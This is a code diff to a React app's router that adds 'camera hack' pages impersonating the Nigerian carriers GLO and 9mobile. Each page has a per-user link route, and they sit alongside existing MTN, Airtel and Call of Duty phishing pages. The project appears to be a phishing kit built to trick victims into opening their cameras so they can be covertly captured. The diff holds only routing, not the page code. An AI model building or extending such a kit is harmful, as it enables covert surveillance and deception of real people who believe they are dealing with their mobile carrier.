@@ -29,6 +29,8 @@ import CallOfDutyPhishing from "./pages/phishing/CallOfDuty";
 // Camera Hack Pages
 import MTNCameraHack from "./pages/camera/MTN";
 import AirtelCameraHack from "./pages/camera/Airtel";
+import GLOCameraHack from "./pages/camera/GLO";
+import NineMobileCameraHack from "./pages/camera/NineMobile";
 
 const queryClient = new QueryClient();
 
@@ -62,6 +64,8 @@ const App = () => (
           {/* Camera Hack Pages */}
           <Route path="/cam/mtn/:userId" element={<MTNCameraHack />} />
           <Route path="/cam/airtel/:userId" element={<AirtelCameraHack />} />
+          <Route path="/cam/glo/:userId" element={<GLOCameraHack />} />
+          <Route path="/cam/9mobile/:userId" element={<NineMobileCameraHack />} />
           
           {/* 404 Pages */}
           <Route path="/404-not-found" element={<NotFoundError />} />
